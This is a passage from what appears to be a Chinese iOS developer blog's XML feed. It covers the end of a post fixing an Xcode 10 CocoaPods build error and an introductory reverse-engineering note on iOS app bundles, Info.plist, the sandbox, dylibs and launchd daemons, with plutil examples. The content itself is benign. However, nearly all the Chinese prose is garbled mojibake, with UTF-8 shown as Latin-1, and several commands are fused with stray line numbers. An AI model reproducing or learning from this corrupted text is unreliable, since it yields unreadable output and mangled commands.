æ³•é€šè¿‡ã€‚ åªè¦åˆ‡æ¢åˆ°Xcode10çš„æ–°ç¼–è¯‘å™¨å°±æŠ¥é”™error: unable to open dependencies file xxxï¼ŒçŒœæµ‹åº”è¯¥æ˜¯æ–°çš„ç¼–è¯‘å™¨ä¾èµ–æ£€æµ‹å¼•èµ·çš„ã€‚ é—®é¢˜ &amp; è§£å†³ç¼–è¯‘é”™è¯¯å¦‚ä¸‹1unable to open dependencies file (/Users/sevencho/Library/Developer/Xcode/DerivedData/KYPetNearby-aslcxdeqowvpemcspggokzrpkzcp/Build/Intermediates.noindex/Pods.build/Debug-iphonesimulator/Pods-KYPetNearby.build/SwiftStdLibToolInputDependencies.dep) å°è¯•è§£å†³ é¦–å…ˆç¡®å®šä»£ç æ²¡æœ‰é—®é¢˜åŽï¼Œæ ¹æ®é”™è¯¯ä¿¡æ¯æ˜¯åœ¨è¿™ä¸ªPods-KYPetNearby.buildæ–‡ä»¶é‡Œé¢å‡ºçŽ°ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æ–°å¼€å‘å·¥å…·çš„æ–°ç¼–è¯‘å™¨åœ¨æ£€æµ‹CocoaPodså¯¼è‡´çš„é—®é¢˜ã€‚ å°è¯•1ï¼š ç§»é™¤æ‰€æœ‰å·²ç»Pod installå®‰è£…çš„åº“ï¼Œæ¸…ç©ºé¡¹ç›®ç¼“å­˜ é‡æ–°Pod installå®‰è£…éœ€è¦çš„åº“ é‡æ–°ç¼–è¯‘é¡¹ç›®ï¼Œä¾ç„¶æ˜¯å‡ºçŽ°ç›¸åŒçš„é”™è¯¯ å°è¯•2ï¼š æ¸…ç©ºé¡¹ç›®ç¼“å­˜ Pod updateæ›´æ–°æ‰€æœ‰å®‰è£…çš„åº“ é‡æ–°ç¼–è¯‘é¡¹ç›®ï¼Œä¾ç„¶æ˜¯å‡ºçŽ°ç›¸åŒçš„é”™è¯¯ å°è¯•3ï¼šï¼ˆçŒœæµ‹å¯èƒ½æ˜¯CocoaPodsç‰ˆæœ¬é—®é¢˜ï¼‰ æ¸…ç©ºé¡¹ç›®ç¼“å­˜ æ›´æ–°CocoaPods 12sudo gem update --systemsudo gem install cocoapods -n/usr/local/bin æ›´æ–°æ‰€æœ‰å®‰è£…çš„åº“ 1pod update é‡æ–°ç¼–è¯‘é¡¹ç›®ï¼Œä¸–ç•Œæ¢å¤å’Œå¹³äº†ã€‚]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>Xcode10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSé€†å‘ç¬”è®°ï¼ˆäºŒï¼‰ï¼šiOSäºŒè¿›åˆ¶æ–‡ä»¶ç±»åž‹]]></title>
    <url>%2Farchives%2Fc7624e77.html</url>
    <content type="text"><![CDATA[äººæ´»åœ¨ä¸–ç•Œä¸Šï¼Œå¿«ä¹å’Œç—›è‹¦æœ¬å°±åˆ†ä¸æ¸…ã€‚æ‰€ä»¥æˆ‘åªæ±‚å®ƒè´§çœŸä»·å®žã€‚ â€”â€”çŽ‹å°æ³¢ ã€Šé©å‘½æ—¶æœŸçš„çˆ±æƒ…ã€‹ iOSäºŒè¿›åˆ¶æ–‡ä»¶ç±»åž‹ åœ¨iOSé€†å‘å·¥ç¨‹åˆå­¦é˜¶æ®µï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¸»è¦æ˜¯Applicationã€Dynamic Libraryï¼ˆä»¥ä¸‹ç®€ç§°dylibï¼‰å’ŒDaemonè¿™ä¸‰ç±»äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯¹å®ƒä»¬çš„äº†è§£è¶Šæ·±å…¥ï¼Œé€†å‘å·¥ç¨‹å°±ä¼šè¶Šé¡ºåˆ©ã€‚è¿™ä¸‰ç±»æ–‡ä»¶åˆ†å·¥ä¸åŒï¼Œå…¶ç›®å½•ç»“æž„å’Œæ–‡ä»¶æƒé™ä¹Ÿæœ‰ä¸€äº›åŒºåˆ«ã€‚ Application Applicationå°±æ˜¯æˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„Appäº†ã€‚è™½ç„¶å¯¹äºŽå¤§å¤šæ•°iOSå¼€å‘è€…æ¥è¯´ï¼Œå·¥ä½œéƒ½æ˜¯åœ¨è·ŸAppæ‰“äº¤é“ï¼Œä½†åœ¨iOSé€†å‘å·¥ç¨‹ä¸­ï¼Œå…³æ³¨Appçš„ä¾§é‡ç‚¹ä¸Žæ­£å‘å¼€å‘è¿˜æ˜¯ä¸å°½ç›¸åŒçš„ã€‚äº†è§£ä¸‹é¢çš„å‡ ä¸ªAppç›¸å…³æ¦‚å¿µï¼Œæ˜¯å¼€å§‹é€†å‘å·¥ç¨‹å‰çš„å¿…å¤‡å·¥ä½œã€‚ bundle bundleçš„æ¦‚å¿µæ¥æºäºŽNeXTSTEPï¼Œå®ƒä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œæ˜¯ä¸€ä¸ªæŒ‰æŸç§æ ‡å‡†ç»“æž„æ¥ç»„ç»‡çš„ç›®å½•ï¼Œå…¶ä¸­åŒ…å«äº†äºŒè¿›åˆ¶æ–‡ä»¶åŠè¿è¡Œæ‰€éœ€çš„èµ„æºã€‚æ­£å‘å¼€å‘ä¸­å¸¸è§çš„Appå’Œframeworkéƒ½æ˜¯ä»¥bundleçš„å½¢å¼å­˜åœ¨çš„ï¼›åœ¨è¶Šç‹±iOSä¸­å¸¸è§çš„PreferenceBundleï¼Œå¯ä»¥çœ‹æˆæ˜¯ä¸€ç§ä¾é™„äºŽSettingsçš„Appï¼Œç»“æž„ä¸ŽAppç±»ä¼¼ï¼Œæœ¬è´¨ä¹Ÿæ˜¯bundleã€‚ Frameworkä¹Ÿæ˜¯bundleï¼Œä½†frameworkçš„bundleä¸­å­˜æ”¾çš„æ˜¯ä¸€ä¸ªdylibï¼Œè€Œä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç›¸å¯¹æ¥è¯´ï¼Œframeworkçš„åœ°ä½æ¯”Appæ›´é«˜ï¼Œå› ä¸ºä¸€ä¸ªAppçš„ç»å¤§å¤šæ•°åŠŸèƒ½éƒ½æ˜¯é€šè¿‡è°ƒç”¨frameworkæä¾›çš„æŽ¥å£æ¥å®žçŽ°çš„ã€‚å°†æŸä¸ªbundleç¡®ç«‹ä¸ºé€†å‘ç›®æ ‡åŽï¼Œç»å¤§å¤šæ•°é€†å‘çº¿ç´¢éƒ½å¯ä»¥åœ¨bundleå†…æ‰¾åˆ°ï¼Œè¿™å¤§å¤§é™ä½Žäº†é€†å‘å·¥ç¨‹çš„å¤æ‚åº¦ã€‚ Appç›®å½•ç»“æž„ åœ¨iOSé€†å‘å·¥ç¨‹ä¸­ï¼Œå¯¹Appç›®å½•ç»“æž„çš„ç†Ÿæ‚‰ç¨‹åº¦æ˜¯å†³å®šå·¥ä½œæ•ˆçŽ‡çš„é‡è¦å› ç´ ã€‚Appç›®å½•çš„ä»¥ä¸‹ä¸‰ä¸ªéƒ¨åˆ†æ¯”è¾ƒé‡è¦ã€‚ Info.plist Info.plistè®°å½•äº†Appçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚bundle identifierã€å¯æ‰§è¡Œæ–‡ä»¶åã€å›¾æ ‡æ–‡ä»¶åç­‰ã€‚å¯ä»¥é€šè¿‡XcodeæŸ¥çœ‹å®ƒçš„å€¼ï¼Œä¹Ÿå¯ä»¥é€šè¿‡Xcodeè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·plutilæŸ¥çœ‹å®ƒçš„å€¼ï¼Œå¦‚ä¸‹ï¼š 123plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/Info.plist | grep CFBundleIdentifier&quot;CFBundleIdentifier&quot; =&gt; &quot;com.apple.SiriViewService&quot; å¯æ‰§è¡Œæ–‡ä»¶ å¯æ‰§è¡Œæ–‡ä»¶çš„é‡è¦æ€§ä¸è¨€è€Œå–»ï¼Œå®ƒæ˜¯Appç›®å½•ä¸‹æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯é€†å‘å·¥ç¨‹æœ€ä¸»è¦çš„ç›®æ ‡ã€‚åŒæ ·å¯ä»¥é€šè¿‡Xcodeå’Œplutilä¸¤ç§æ–¹å¼æ¥æŸ¥çœ‹Info.plistï¼Œå®šä½å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç”¨XcodeæŸ¥çœ‹Info.plistçš„ç•Œé¢ï¼Œä¹Ÿå¯ä»¥é€šè¿‡Xcodeè‡ªå¸¦çš„å‘½ä»¤è¡Œå·¥å…·plutilæŸ¥çœ‹å®ƒçš„å€¼ï¼Œå¦‚ä¸‹ï¼š 12snakeninny$ plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/Info.plist| grep CFBundleExecutable&quot;CFBundleExecutable&quot; =&gt; &quot;SiriViewService&quot; lprojç›®å½• lprojç›®å½•ä¸‹å­˜æ”¾çš„æ˜¯å„ç§æœ¬åœ°åŒ–çš„å­—ç¬¦ä¸²ï¼ˆ.stringsï¼‰ï¼Œæ˜¯iOSé€†å‘å·¥ç¨‹çš„é‡è¦çº¿ç´¢ï¼Œä¹Ÿå¯ä»¥ç”¨plutilæŸ¥çœ‹ï¼Œå¦‚ä¸‹ï¼š 12345678910 plutil -p /Users/snakeninny/Code/iOSSystemBinaries/8.1_iPhone5/SiriViewService.app/en.lproj/Localizable.strings&#123; &quot;ASSISTANT_INITIAL_QUERY_IPAD&quot; =&gt; &quot;What can I help youwith?&quot; &quot;ASSISTANT_BOREALIS_EDUCATION_SUBHEADER_IPAD&quot; =&gt; &quot;Justsay &quot;Hey Siri&quot; to learn more.&quot; &quot;ASSISTANT_FIRST_UNLOCK_SUBTITLE_FORMAT&quot; =&gt; &quot;Yourpasscode is required when %@ restarts&quot;â€¦â€¦ ç³»ç»ŸApp VS StoreApp /Applications/ç›®å½•å­˜æ”¾ç³»ç»ŸAppå’Œä»ŽCydiaä¸‹è½½çš„Appï¼ˆæˆ‘ä»¬æŠŠæ¥è‡ªCydiaçš„Appè§†ä¸ºç³»ç»ŸAppï¼‰ï¼Œè€Œ/var/mobile/Containers/ç›®å½•å­˜æ”¾çš„åˆ™æ˜¯StoreAppã€‚è™½ç„¶ä¸¤è€…éƒ½æ˜¯Appï¼Œä½†å®ƒä»¬åœ¨å¦‚ä¸‹æ–¹é¢å­˜åœ¨ç€ä¸€äº›å·®åˆ«ã€‚ ç›®å½•ç»“æž„ ä¸¤ç§Appçš„bundleå†…éƒ¨ç›®å½•ç»“æž„åŒºåˆ«ä¸å¤§ï¼Œéƒ½å«æœ‰Info.plistã€å¯æ‰§è¡Œæ–‡ä»¶ã€lprojç›®å½•ç­‰ï¼Œä½†æ˜¯æ•°æ®ç›®å½•çš„ä½ç½®ä¸åŒï¼šStoreAppçš„æ•°æ®ç›®å½•åœ¨/var/mobile/Containers/Data/ä¸‹ï¼Œä»¥mobileæƒé™è¿è¡Œçš„ç³»ç»ŸAppçš„æ•°æ®ç›®å½•åœ¨/var/mobile/ä¸‹ï¼Œè€Œä»¥rootæƒé™è¿è¡Œçš„ç³»ç»ŸAppçš„æ•°æ®ç›®å½•åœ¨/var/root/ä¸‹ã€‚ å®‰è£…åŒ…æ ¼å¼ä¸Žæƒé™ Cydia Appçš„å®‰è£…åŒ…æ ¼å¼ä¸€èˆ¬æ˜¯debï¼ŒStoreAppçš„å®‰è£…åŒ…æ ¼å¼ä¸€èˆ¬æ˜¯ipaã€‚å…¶ä¸­debæ˜¯æ¥è‡ªDebiançš„å®‰è£…åŒ…æ ¼å¼ï¼Œç”±Cydiaä½œè€…saurikç§»æ¤åˆ°iOSä¸­ï¼Œå®ƒçš„å±žä¸»ç”¨æˆ·å’Œå±žä¸»ç»„ä¸€èˆ¬æ˜¯rootå’Œadminï¼Œèƒ½å¤Ÿä»¥rootæƒé™è¿è¡Œï¼›è€Œipaæ˜¯è‹¹æžœä¸ºiOSæŽ¨å‡ºçš„ä¸“å±žAppå®‰è£…åŒ…æ ¼å¼ï¼Œå±žä¸»ç”¨æˆ·å’Œå±žä¸»ç»„éƒ½æ˜¯mobileï¼Œåªèƒ½ä»¥mobileæƒé™è¿è¡Œã€‚ æ²™ç›’ï¼ˆsandboxï¼‰ é€šä¿—åœ°è¯´ï¼ŒiOSä¸­çš„æ²™ç›’å°±æ˜¯ä¸€ç§è®¿é—®é™åˆ¶æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯æƒé™çš„ä¸€ç§è¡¨çŽ°å½¢å¼ï¼ŒæŽˆæƒæ–‡ä»¶ï¼ˆentitlementsï¼‰ä¹Ÿæ˜¯æ²™ç›’çš„ä¸€éƒ¨åˆ†ã€‚å®ƒæ˜¯iOSæœ€æ ¸å¿ƒçš„å®‰å…¨ç»„ä»¶ä¹‹ä¸€ï¼Œå…¶å®žçŽ°å¾ˆå¤æ‚ï¼Œè¿™é‡Œä¸è¿‡å¤šè®¨è®ºå…¶ç»†èŠ‚ã€‚æ€»çš„æ¥è¯´ï¼Œæ²™ç›’ä¼šå°†Appçš„æ–‡ä»¶è®¿é—®èŒƒå›´é™åˆ¶åœ¨è¿™ä¸ªAppå†…éƒ¨ï¼Œä¸€ä¸ªAppä¸€èˆ¬ä¸çŸ¥é“å…¶ä»–Appçš„å­˜åœ¨ï¼Œæ›´åˆ«è¯´è®¿é—®å®ƒä»¬äº†ï¼›æ²™ç›’è¿˜ä¼šé™åˆ¶Appçš„åŠŸèƒ½ï¼Œä¾‹å¦‚å¯¹iCloudæŽ¥å£çš„è°ƒç”¨å°±å¿…é¡»ç»è¿‡æ²™ç›’çš„å…è®¸ã€‚ åœ¨åˆå­¦é˜¶æ®µï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¸æ˜¯æ²™ç›’ï¼ŒçŸ¥é“æœ‰è¿™æ ·ä¸€ä¸ªä¸œè¥¿å­˜åœ¨å°±å¤Ÿäº†ã€‚åœ¨iOSé€†å‘å·¥ç¨‹ä¸­ï¼Œè¶Šç‹±æœ¬èº«å·²ç»ç ´é™¤äº†iOSçš„ç»å¤§å¤šæ•°å®‰å…¨é™åˆ¶ï¼Œå¹¶å¯¹æ²™ç›’è¿›è¡Œäº†ä¸€å®šç¨‹åº¦çš„æ‰©å……ï¼Œå› æ­¤æˆ‘ä»¬å¾€å¾€å¾ˆå®¹æ˜“å¿½ç•¥sandboxçš„å­˜åœ¨ï¼Œä»Žè€Œç¢°åˆ°ä¸€äº›çœ‹ä¼¼å¾ˆå¥‡æ€ªçš„é—®é¢˜ã€‚æ¯”å¦‚æŸä¸ªtweakä¸èƒ½å†™æ–‡ä»¶ï¼Œè°ƒç”¨äº†æŸä¸ªå‡½æ•°å´æ²¡æœ‰å‡ºçŽ°åº”æœ‰çš„æ•ˆæžœï¼Œåœ¨ç¡®ä¿è‡ªå·±çš„ä»£ç æ²¡æœ‰é—®é¢˜çš„å‰æä¸‹ï¼Œå°±è¦å›žè¿‡å¤´æ¥æ£€æŸ¥è¿™äº›é—®é¢˜æ˜¯ä¸æ˜¯å› ä¸ºæƒé™ä¸å¤Ÿï¼Œæˆ–è€…æ²™ç›’é™åˆ¶é€ æˆçš„ã€‚ Dynamic Library å¤§éƒ¨åˆ†iOSå¼€å‘è€…çš„æ—¥å¸¸å·¥ä½œåº”è¯¥éƒ½æ˜¯å†™Appï¼Œä¼°è®¡å¾ˆå°‘æœ‰äººå†™è¿‡dylibï¼Œå› æ­¤å¯¹dylibçš„æ¦‚å¿µå¾ˆé™Œç”Ÿã€‚æ®Šä¸çŸ¥ï¼Œåœ¨Xcodeå·¥ç¨‹é‡Œå¯¼å…¥çš„å„ç§frameworkï¼Œé“¾æŽ¥çš„å„ç§libï¼Œå…¶å®žæœ¬è´¨éƒ½æ˜¯dylibã€‚å¯ä»¥ç”¨â€œfileâ€å‘½ä»¤éªŒè¯ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š 123file /Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/Frameworks/UIKit.framework/UIKit/Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/Frameworks/UIKit.framework/UIKit: Mach-O dynamically linked shared library arm å¦‚æžœæŠŠç„¦ç‚¹è½¬ç§»åˆ°è¶Šç‹±iOSä¸­ï¼ŒCydiaé‡Œçš„å„ç§tweakæ— ä¸€ä¸æ˜¯ä»¥dylibçš„å½¢å¼å·¥ä½œçš„ï¼Œæ­£æ˜¯è¿™äº›tweakçš„å­˜åœ¨è®©æˆ‘ä»¬èƒ½å¤Ÿéšæ„å®šåˆ¶è‡ªå·±çš„iOSã€‚åœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šé¢‘ç¹æŽ¥è§¦å„ç§dylibï¼Œå› æ­¤æœ‰å¿…è¦äº†è§£ä¸€äº›ç›¸å…³çŸ¥è¯†ã€‚ åœ¨iOSä¸­ï¼Œlibåˆ†ä¸ºstaticå’Œdynamicä¸¤ç§ï¼Œå…¶ä¸­staticlibåœ¨ç¼–è¯‘é˜¶æ®µæˆä¸ºAppå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œä¼šå¢žåŠ å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ã€‚å› ä¸ºAppå°ºå¯¸å˜å¤§ï¼Œå¯åŠ¨æ—¶éœ€è¦åŠ è½½çš„å†…å®¹å˜å¤šï¼Œæ‰€ä»¥å¯èƒ½ä¼šå¯¼è‡´Appå¯åŠ¨å˜æ…¢ã€‚dylibåˆ™ç›¸å¯¹â€œæ™ºèƒ½â€ä¸€äº›ï¼Œå®ƒä¸ä¼šæ”¹å˜å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œåªæœ‰å½“Appéœ€è¦ç”¨åˆ°è¿™ä¸ªdylibæ—¶ï¼ŒiOSæ‰ä¼šæŠŠå®ƒåŠ è½½è¿›å†…å­˜ï¼Œæˆä¸ºAppè¿›ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œdylibè™½ç„¶å……æ–¥åœ¨iOSçš„å„ä¸ªè§’è½ï¼Œæ˜¯é€†å‘å·¥ç¨‹çš„é‡è¦ç›®æ ‡ç±»åž‹ï¼Œä½†å…¶æœ¬èº«å¹¶ä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸èƒ½ç‹¬ç«‹è¿è¡Œï¼Œåªèƒ½ä¸ºåˆ«çš„è¿›ç¨‹æœåŠ¡ï¼Œè€Œä¸”å®ƒä»¬å¯„ç”Ÿåœ¨åˆ«çš„è¿›ç¨‹é‡Œï¼Œæˆä¸ºäº†è¿™ä¸ªè¿›ç¨‹çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤ï¼Œdylibçš„æƒé™æ˜¯ç”±å®ƒå¯„ç”Ÿçš„é‚£ä¸ªAppå†³å®šçš„ï¼ŒåŒä¸€ä¸ªdylibå¯„ç”Ÿåœ¨ç³»ç»ŸAppå’ŒStoreAppé‡Œæ—¶çš„æƒé™æ˜¯ä¸åŒçš„ã€‚ä¾‹å¦‚ï¼Œä½ å†™äº†ä¸€ä¸ªInstagramçš„tweakï¼Œç”¨æ¥æŠŠå–œæ¬¢çš„å›¾ç‰‡ä¿å­˜åœ¨æœ¬åœ°ï¼Œå¦‚æžœä¿å­˜ç›®å½•æ˜¯/var/mobile/Containers/Data/ä¸‹Appå¯¹åº”çš„Documentsç›®å½•ï¼Œé‚£ä¹ˆå› ä¸ºInstagramæ˜¯ä¸€ä¸ªStoreAppï¼Œè¿™æ ·çš„æ“ä½œæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œtweakèƒ½å¤Ÿæ­£å¸¸å·¥ä½œã€‚è€Œå¦‚æžœä¿å­˜ç›®å½•æ˜¯/var/mobile/Documentsï¼Œé‚£ä¹ˆåœ¨å…´é«˜é‡‡çƒˆåœ°ä¿å­˜äº†ä¸€å¤§å †ç¾Žå›¾ï¼Œå‡†å¤‡å›žå¤´ç»†ç»†å“å‘³æ—¶ï¼Œä½ å°±ä¼šå‘çŽ°/var/mobile/Documentsé‡Œå•¥å›¾ç‰‡ä¹Ÿæ²¡æœ‰â€”â€”æ“ä½œéƒ½è¢«sandboxç»™ç¦æŽ‰äº†ã€‚ Daemon ç›¸ä¿¡ç»å¤§éƒ¨åˆ†å¼€å‘è€…ä»ŽæŽ¥è§¦iOSå¼€å‘çš„ç¬¬ä¸€å¤©èµ·ï¼Œå°±ä¸æ–­è¢«è‹¹æžœçŒè¾“è¿™æ ·ä¸€ä¸ªè§‚å¿µâ€”â€”iOSä¸­æ²¡æœ‰çœŸæ­£çš„åŽå°å¤šä»»åŠ¡ï¼Œä½ çš„Appåœ¨åŽå°å°†è¢«å¤§å¤§é™åˆ¶ã€‚å¦‚æžœä½ æ˜¯ä¸€ä¸ªçº¯ç²¹çš„App Storeå¼€å‘è€…ï¼Œåšä¿¡å¹¶åšå®ˆè¿™ä¸ªè§‚å¿µï¼Œé‚£ä¹ˆå®ƒå°†æ˜¯ä½ çš„Appé€šè¿‡è‹¹æžœå®¡æ ¸çš„åŠ©æŽ¨å‰‚ï¼›ä½†æƒ³è¦åœ¨å­¦ä¹ é€†å‘å·¥ç¨‹çš„åŒæ—¶äº†è§£ä¸€äº›å®˜æ–¹æ–‡æ¡£æ²¡æœ‰é˜è¿°çš„äº‹å®žï¼Œé‚£ä¹ˆä½ å°±è¦ä¿æŒå†·é™ï¼Œç†æ€§æ€è€ƒã€‚è®©æˆ‘ä»¬ä¸€èµ·å›žæƒ³ä¸€ä¸‹iPhoneä¸Šçš„ä¸€äº›çŽ°è±¡ã€‚ å½“æˆ‘ä»¬æ­£åœ¨ç”¨iPhoneä¸Šç½‘æˆ–åˆ·å¾®åšæ—¶æ¥äº†ä¸€ä¸ªç”µè¯ï¼Œæ‰€æœ‰å…¶ä»–æ“ä½œä¼šç«‹å³ä¸­æ–­ï¼ŒiOSç¬¬ä¸€æ—¶é—´å°†æŽ¥å¬ç”µè¯çš„ç•Œé¢å‘ˆçŽ°åœ¨æˆ‘ä»¬é¢å‰ã€‚å¦‚æžœiOSä¸­æ²¡æœ‰çœŸæ­£çš„åŽå°å¤šä»»åŠ¡ï¼Œç³»ç»Ÿæ˜¯å¦‚ä½•å®žæ—¶å¤„ç†è¿™ä¸ªæ¥ç”µçš„å‘¢ï¼Ÿ å¯¹äºŽé‚£äº›ç»å¸¸æ”¶åˆ°åžƒåœ¾çŸ­ä¿¡å’Œéªšæ‰°ç”µè¯çš„æœ‹å‹æ¥è¯´ï¼Œç±»ä¼¼äºŽSMSNinjaè¿™æ ·çš„é˜²ç«å¢™è½¯ä»¶å¿…ä¸å¯å°‘ã€‚å¦‚æžœå®ƒä¸èƒ½å¸¸é©»iOSåŽå°ï¼Œæ€Žä¹ˆèƒ½å¤Ÿå®žæ—¶åœ°å¤„ç†å¹¶è¿‡æ»¤æ”¶åˆ°çš„æ¯ä¸€æ¡çŸ­ä¿¡å‘¢ï¼Ÿ Backgrounderæ˜¯ä¸€æ¬¾iOS 5æ—¶ä»£çš„æ’ä»¶ï¼Œå®ƒèƒ½å¤Ÿå¸®åŠ©Appå®žçŽ°çœŸæ­£çš„åŽå°è¿è¡Œã€‚æœ‰äº†å®ƒï¼Œæˆ‘ä»¬å†ä¹Ÿä¸ç”¨æ‹…å¿ƒå› ä¸ºpushåŠŸèƒ½çš„ä¸ç»™åŠ›è€Œæ¼æ”¶QQæ¶ˆæ¯å•¦ï¼ å¦‚æžœiOSä¸­æ²¡æœ‰çœŸæ­£çš„åŽå°å¤šä»»åŠ¡ï¼ŒBackgrounderæ€Žä¹ˆä¼šå­˜åœ¨å‘¢ï¼Ÿ è¿™äº›çŽ°è±¡æ— ä¸€ä¸è¯´æ˜ŽiOSå®žé™…ä¸Šå­˜åœ¨çœŸæ­£çš„åŽå°å¤šä»»åŠ¡ã€‚é‚£ä¹ˆéš¾é“æ˜¯è‹¹æžœè¯´é”™äº†ï¼Ÿå¹¶ä¸æ˜¯ï¼å¯¹äºŽStoreAppæ¥è¯´ï¼Œå½“ç”¨æˆ·æŒ‰ä¸‹homeé”®æ—¶ï¼Œè¿›ç¨‹å°±è¿›å…¥åŽå°äº†ï¼Œå¤§å¤šæ•°åŠŸèƒ½éƒ½ä¼šè¢«æš‚åœï¼›ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºŽéµçºªå®ˆæ³•çš„App Storeå¼€å‘è€…æ¥è¯´ï¼Œå¯ä»¥æŠŠiOSçœ‹ä½œæ˜¯æ²¡æœ‰çœŸæ­£åŽå°å¤šä»»åŠ¡çš„ç³»ç»Ÿï¼Œå› ä¸ºä½ å”¯ä¸€èƒ½å¹²çš„äº‹ä¸æ”¯æŒåŽå°å¤šä»»åŠ¡ã€‚ä½†iOSæºäºŽOSXï¼ŒåŽè€…åˆè·Ÿæ‰€æœ‰ç±»UNIXæ“ä½œç³»ç»Ÿä¸€æ ·ï¼Œæœ‰daemonï¼ˆå³å®ˆæŠ¤è¿›ç¨‹ï¼ŒWindowsç§°Serviceï¼‰çš„æ¦‚å¿µã€‚è¶Šç‹±å¼€æ”¾äº†iOSå…¨æ–‡ä»¶ç³»ç»Ÿï¼Œdaemonä¹Ÿå¾—ä»¥å±•çŽ°åœ¨æˆ‘ä»¬é¢å‰ã€‚ Daemonä¸ºåŽå°è¿è¡Œè€Œç”Ÿï¼Œç»™ç”¨æˆ·æä¾›äº†å„ç§â€œå®ˆæŠ¤â€ï¼Œå¦‚imagentä¿éšœäº†iMessageçš„æ­£ç¡®æ”¶å‘ï¼Œmediaserverdå¤„ç†äº†å‡ ä¹Žæ‰€æœ‰çš„éŸ³é¢‘ã€è§†é¢‘ï¼Œsyslogdåˆ™ç”¨äºŽè®°å½•ç³»ç»Ÿæ—¥å¿—ç­‰ã€‚iOSä¸­çš„daemonä¸»è¦ç”±ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å’Œä¸€ä¸ªplistæ–‡ä»¶æž„æˆã€‚iOSçš„æ ¹è¿›ç¨‹æ˜¯launchdï¼Œå®ƒä¼šåœ¨å¼€æœºæ—¶æ£€æŸ¥/System/Library/LaunchDaemonså’Œ/Library/LaunchDaemonsä¸‹æ‰€æœ‰æ ¼å¼ç¬¦åˆè§„å®šçš„plistæ–‡ä»¶ï¼Œç„¶åŽå¯åŠ¨å¯¹åº”çš„daemonã€‚è¿™é‡Œçš„plistæ–‡ä»¶ä¸ŽAppä¸­çš„Info.plistæ–‡ä»¶ä½œç”¨ç±»ä¼¼ï¼Œå³è®°å½•daemonçš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728plutil -p/Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/LaunchDaemons/com.apple.imagent.plist&#123; &quot;WorkingDirectory&quot; =&gt; &quot;/tmp&quot; &quot;Label&quot; =&gt; &quot;com.apple.imagent&quot; &quot;JetsamProperties&quot; =&gt; &#123; &quot;JetsamMemoryLimit&quot; =&gt; 3000 &#125; &quot;EnvironmentVariables&quot; =&gt; &#123; &quot;NSRunningFromLaunchd&quot; =&gt; &quot;1&quot; &#125; &quot;POSIXSpawnType&quot; =&gt; &quot;Interactive&quot; &quot;MachServices&quot; =&gt; &#123; &quot;com.apple.hsa-authentication-server&quot; =&gt; 1 &quot;com.apple.imagent.embedded.auth&quot; =&gt; 1 &quot;com.apple.incoming-call-filter-server&quot; =&gt; 1 &#125; &quot;UserName&quot; =&gt; &quot;mobile&quot; &quot;RunAtLoad&quot; =&gt; 1 &quot;ProgramArguments&quot; =&gt; [ 0 =&gt;&quot;/System/Library/PrivateFrameworks/IMCore.framework/imagent.app/imagent&quot; ] &quot;KeepAlive&quot; =&gt; &#123; &quot;SuccessfulExit&quot; =&gt; 0 &#125;&#125; ç›¸å¯¹äºŽAppï¼Œdaemonæä¾›çš„åŠŸèƒ½è¦åº•å±‚å¾—å¤šï¼Œé€†å‘éš¾åº¦ä¹Ÿè¦å¤§å¾—å¤šï¼Œéšæ„æ”¹åŠ¨é€ æˆçš„åŽæžœå½“ç„¶ä¹Ÿå°±ä¸¥é‡å¾—å¤šï¼Œæ‰€ä»¥ç™½è‹¹æžœçš„æƒ¨æ¡ˆæ‰ä¼šæ—¶æœ‰å‘ç”Ÿã€‚åœ¨iOSé€†å‘å·¥ç¨‹åˆå­¦é˜¶æ®µï¼Œè¯·ä¸è¦æŠŠdaemonå½“ä½œç»ƒä¹ ç›®æ ‡ï¼›å½“ä½ é€†å‘äº†å‡ ä¸ªAppï¼Œæœ‰äº†ä¸€å®šçš„å¿ƒå¾—å’Œç§¯ç´¯åŽå†æŒ‘æˆ˜è¿™äº›daemonæ‰æ˜¯æ¯”è¾ƒæ˜Žæ™ºçš„é€‰æ‹©ã€‚ç›¸æ¯”Appï¼Œé€†å‘daemonèŠ±è´¹çš„æ—¶é—´å’Œç²¾åŠ›ä¼šæ›´å¤šï¼Œä½†æ›´å¤šçš„ä»˜å‡ºä¸€å®šä¼šå¸¦æ¥æ›´ä¸°åŽšçš„å›žæŠ¥ã€‚ä¾‹å¦‚ï¼Œâ€œiOSä¸Šçš„ç¬¬ä¸€æ¬¾ç”µè¯å½•éŸ³è½¯ä»¶â€Audio 